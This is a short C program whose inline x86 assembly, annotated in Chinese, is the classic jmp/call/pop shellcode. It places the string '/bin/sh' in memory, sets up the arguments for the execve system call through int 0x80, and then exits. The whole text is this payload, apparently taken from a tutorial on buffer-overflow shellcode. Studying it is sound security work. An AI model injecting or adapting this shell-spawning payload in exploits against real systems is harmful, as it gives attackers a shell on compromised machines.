int main ()
{
    __asm__
    ("
        jmp    0x2a              //跳转到call指令处
        popl   %esi              //esi中存放字符串地址
        movl   %esi,0x8(%esi)    //将字符串地址放到字符串后面(NULL位置留下)
        movb   $0x0,0x7(%esi)    //将0放到字符串尾部
        movl   $0x0,0xc(%esi)    //将NULL放到字符串地址后面(8+4)
        movl   $0xb,%eax         //execve系统调用
        movl   %esi,%ebx         //参数1，字符串地址
        leal   0x8(%esi),%ecx    //参数2,数组首地址即字符串地址的地址
        leal   0xc(%esi),%edx    //参数3,NULL的地址
        int    $0x80             //执行软中断
        movl   $0x1, %eax        //exit系统调用
        movl   $0x0, %ebx        //第一个参数
        int    $0x80             //执行软中断
        call   -0x2f             //将下一条指令压栈后跳转到popl处
        .string \"/bin/sh\"      //Shell
    ");
}
